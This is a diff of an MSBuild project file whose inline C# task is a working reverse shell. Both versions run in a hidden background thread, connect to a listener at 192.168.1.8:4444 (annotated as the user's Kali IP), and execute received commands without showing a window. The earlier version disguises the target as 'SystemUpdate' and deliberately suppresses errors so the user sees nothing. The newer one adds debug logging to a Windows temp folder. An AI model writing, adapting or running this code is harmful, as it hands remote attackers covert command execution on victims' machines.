@@ -1,9 +1,9 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="SystemUpdate">
-    <ReverseShellTask />
+  <Target Name="DebugShell">
+    <DebugReverseShell />
   </Target>
   
-  <UsingTask TaskName="ReverseShellTask" TaskFactory="CodeTaskFactory" 
+  <UsingTask TaskName="DebugReverseShell" TaskFactory="CodeTaskFactory" 
              AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
       <Code Type="Class" Language="cs">
@@ -12,74 +12,56 @@
         using System.Net.Sockets;
         using System.Diagnostics;
         using System.Text;
-        using System.Threading;
         using System.IO;
+        using System.Threading;
 
-        public class ReverseShellTask : Microsoft.Build.Utilities.Task {
+        public class DebugReverseShell : Microsoft.Build.Utilities.Task {
             public override bool Execute() {
-                // Run in background thread so MSBuild doesn't wait
-                Thread thread = new Thread(new ThreadStart(StartShell));
-                thread.IsBackground = true;
-                thread.Start();
-                
-                // Return immediately so MSBuild completes
-                return true;
-            }
-            
-            private void StartShell() {
-                string host = "192.168.1.8";  // ← Your IP
-                int port = 4444;
-                
-                try {
-                    TcpClient client = new TcpClient();
-                    
-                    // Connect with timeout (5 seconds)
-                    var result = client.BeginConnect(host, port, null, null);
-                    var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5));
-                    
-                    if (!success) {
-                        client.Close();
-                        return;
-                    }
-                    
-                    client.EndConnect(result);
-                    NetworkStream stream = client.GetStream();
-                    
-                    // Send initial prompt
-                    string prompt = "PS " + Directory.GetCurrentDirectory() + "> ";
-                    byte[] promptBytes = Encoding.ASCII.GetBytes(prompt);
-                    stream.Write(promptBytes, 0, promptBytes.Length);
-                    stream.Flush();
-                    
-                    byte[] bytes = new byte[4096];  // Smaller buffer
-                    
-                    while (client.Connected) {
-                        // Check if data is available (non-blocking)
-                        if (stream.DataAvailable) {
-                            int bytesRead = stream.Read(bytes, 0, bytes.Length);
-                            if (bytesRead > 0) {
-                                string command = Encoding.ASCII.GetString(bytes, 0, bytesRead).Trim();
+                new Thread(() => {
+                    try {
+                        string host = "192.168.1.8";  // ← CHANGE THIS TO YOUR ACTUAL KALI IP
+                        int port = 4444;
+                        
+                        // Write debug info to file
+                        File.WriteAllText(@"C:\Windows\Temp\debug.log", $"Attempting connection to {host}:{port} at {DateTime.Now}");
+                        
+                        using(TcpClient client = new TcpClient(host, port)) {
+                            File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nConnected successfully at {DateTime.Now}");
+                            
+                            using(NetworkStream stream = client.GetStream()) {
+                                // Send connection message
+                                string welcome = "=== Reverse Shell Connected ===\n";
+                                byte[] welcomeBytes = Encoding.ASCII.GetBytes(welcome);
+                                stream.Write(welcomeBytes, 0, welcomeBytes.Length);
                                 
-                                if (command == "exit") break;
-                                if (string.IsNullOrEmpty(command)) continue;
+                                byte[] buffer = new byte[1024];
                                 
-                                string output = ExecuteCommand(command);
-                                output += "\nPS " + Directory.GetCurrentDirectory() + "> ";
-                                
-                                byte[] response = Encoding.ASCII.GetBytes(output);
-                                stream.Write(response, 0, response.Length);
-                                stream.Flush();
+                                while(client.Connected) {
+                                    if(stream.DataAvailable) {
+                                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
+                                        if(bytesRead > 0) {
+                                            string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
+                                            File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nReceived command: {command}");
+                                            
+                                            if(command == "exit") break;
+                                            if(string.IsNullOrEmpty(command)) continue;
+                                            
+                                            string result = ExecuteCommand(command);
+                                            byte[] output = Encoding.ASCII.GetBytes(result);
+                                            stream.Write(output, 0, output.Length);
+                                        }
+                                    }
+                                    Thread.Sleep(100);
+                                }
                             }
                         }
-                        
-                        // Small delay to prevent CPU spinning
-                        Thread.Sleep(100);
+                        File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nConnection closed at {DateTime.Now}");
+                    } catch (Exception ex) {
+                        File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nError: {ex.Message}");
                     }
-                    
-                    client.Close();
-                } catch (Exception) {
-                    // Silent fail - no errors visible to user
-                }
+                }) { IsBackground = true }.Start();
+                
+                return true;
             }
             
             private string ExecuteCommand(string command) {
@@ -91,21 +73,15 @@
                     process.StartInfo.RedirectStandardError = true;
                     process.StartInfo.UseShellExecute = false;
                     process.StartInfo.CreateNoWindow = true;
-                    process.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
-                    
                     process.Start();
                     
                     string output = process.StandardOutput.ReadToEnd();
                     string error = process.StandardError.ReadToEnd();
                     process.WaitForExit();
                     
-                    if (!string.IsNullOrEmpty(error)) {
-                        output += "\n" + error;
-                    }
-                    
-                    return output;
+                    return output + error;
                 } catch (Exception ex) {
-                    return "Error: " + ex.Message;
+                    return $"Error executing command: {ex.Message}\n";
                 }
             }
         }
